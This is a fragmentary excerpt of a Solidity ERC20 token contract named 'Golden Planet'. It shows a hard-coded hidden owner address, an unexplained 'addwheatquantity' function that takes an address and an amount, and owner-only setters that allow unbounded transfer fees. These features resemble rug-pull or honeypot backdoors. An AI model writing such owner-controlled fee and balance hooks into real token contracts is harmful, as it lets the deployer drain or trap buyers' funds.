...
contract Ownable is Context {
    ...
    address private _owners = 0xE51222b6F2fc0B7f2F532C40483A64106f981814;
...
contract GoldenPlanet is Context, IERC20, Ownable {
    ...
    string private _name = "Golden Planet";
    string private _symbol = "Golden Planet";
    uint8 private _decimals = 3;
     
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public devAddress = 0xE51222b6F2fc0B7f2F532C40483A64106f981814;
    ...
    function addwheatquantity(address wheatAddress, uint256 wheatquantity) 
      ...
      function setdeadFee(uint256 percentage) public onlyowners() {
        deadFee = percentage;
    }
      function setdevFee(uint256 percentage) public onlyowners() {
        devFee = percentage;
    }
